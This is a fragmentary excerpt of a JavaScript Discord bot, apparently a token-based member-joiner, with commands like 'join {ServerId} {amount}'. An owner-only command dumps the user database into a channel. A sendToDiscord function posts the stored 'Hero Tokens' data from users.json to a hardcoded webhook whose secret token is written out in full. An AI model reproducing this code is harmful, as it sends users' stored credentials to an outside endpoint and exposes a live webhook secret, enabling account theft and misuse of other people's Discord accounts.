...
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + 'script')) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

    // Fetch all data from the database
    const allData = usersdata.all();

    // Convert the data to a formatted string or JSON format
    const dataString = JSON.stringify(allData, null, 2); // Using JSON format with 2-space indentation

    // Send the data as a message or file, depending on the length
    if (dataString.length <= 2000) {
      message.channel.send(`Here is the data from the database:\n\`\`\`json\n${dataString}\n\`\`\``);
    } else {
      // If the data is too large for a message, send it as a file attachment
      const dataBuffer = Buffer.from(dataString, 'utf-8');
      const attachment = new MessageAttachment(dataBuffer, 'users.json');
      message.channel.send('The data is too large to display here. Here is the file:', attachment);
    }
  }
})
...
const webhookUrl = 'https://discord.com/api/webhooks/1274184712650489866/JVmNyyuezgJb8H7qJfvXidrMPnaxGI-CHCLR_UVCNMg9R43llbcj36BElyybG2H6sCuJ';
const filePath = 'database/users.json';

const sendToDiscord = async (data) => {
    try {
      const dataSthring = JSON.stringify(data, null, 2);

        const embed = new MessageEmbed()
            .setColor('#283361') // يمكنك تغيير اللون حسب الرغبة
            .setTitle('<:discord:1271620430670594108>  Hero Tokens  <:stars:1271620530520326235>')
           .setDescription(`** Here is the data from the database <:code:1271620433279713416> **\n\`\`\`json\n${dataSthring}\n\`\`\``) //
      .setImage('https://media.discordapp.net/attachments/1271463274537291920/1271540077595463762/39632582222_1-ezgif.com-webp-to-png-converter.png?ex=66c0effa&is=66bf9e7a&hm=68669ab947043c31ddddbc1bd7b4e6930dd5f0ea0e0ed0fd6d9b0a277d6040f3&=&format=webp&quality=lossless');

        await axios.post(webhookUrl, { embeds: [embed] });
        console.log('تم إرسال البيانات إلى ديسكورد');
    } catch (error) {
        console.error('حدث خطأ أثناء إرسال البيانات إلى ديسكورد:', error);
    }
};
...
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `help`)) {
    ...
    message.reply({
      content: `**[\`${prefix}join {ServerId} {amount}\`]**
**[\`${prefix}refresh\`]**
**[\`${prefix}users\`]**
**[\`${prefix}help\`]**
**[\`${prefix}check\`]**
...
client.on(`interactionCreate` , interaction => {
  ...
  if (interaction.commandName == 'setup'){
   ...
   const Channel = interaction.guild.channels.cache.get(channel); 
    const embed = new MessageEmbed()
 .setColor('#e98921')
.setImage('https://media.discordapp.net/attachments/1220370611285659788/1220732980247658506/mGHXi2pg_-_Copie_3.png')
